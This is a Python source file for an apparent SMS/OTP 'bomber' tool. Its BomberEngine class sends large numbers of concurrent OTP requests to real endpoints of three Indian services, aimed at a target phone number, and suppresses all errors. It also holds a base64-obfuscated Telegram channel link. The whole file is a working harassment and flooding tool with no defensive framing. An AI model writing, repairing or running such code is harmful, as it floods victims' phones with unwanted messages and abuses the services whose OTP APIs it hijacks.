import base64
import random
import asyncio  # FIXED: Imported missing dependency to clear NameError
import aiohttp

class BomberEngine:
    _CH_RAW = "aHR0cHM6Ly90Lm1lL051bWJlcl9TcHk="
    DECODED_CHANNEL = base64.b64decode(_CH_RAW).decode()

    ENDPOINTS = [
        {
            "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
            "method": "POST",
            "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite"},
            "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
        },
        {
            "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
            "data": lambda phone: f"check_mobile_number=1&contact={phone}"
        },
        {
            "url": "https://www.shemaroome.com/users/resend_otp",
            "method": "POST",
            "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
            "data": lambda phone: f"mobile_no=%2B91{phone}"
        }
    ]

    @classmethod
    async def _send_packet(cls, session: aiohttp.ClientSession, endpoint_cfg: dict, phone: str):
        try:
            url = endpoint_cfg["url"]
            method = endpoint_cfg["method"]
            headers = endpoint_cfg["headers"]
            payload = endpoint_cfg["data"](phone) if endpoint_cfg["data"] else None
            
            async with session.request(method, url, headers=headers, data=payload, timeout=4) as r:
                await r.text()  # Read completely to close the response buffer pool
        except:
            pass

    @classmethod
    async def deploy_flood_matrix(cls, phone_number: str, volume: int):
        """Dispatches asynchronous concurrent requests over targeting numbers."""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(volume):
                api_choice = random.choice(cls.ENDPOINTS)
                tasks.append(cls._send_packet(session, api_choice, phone_number))
            await asyncio.gather(*tasks, return_exceptions=True)

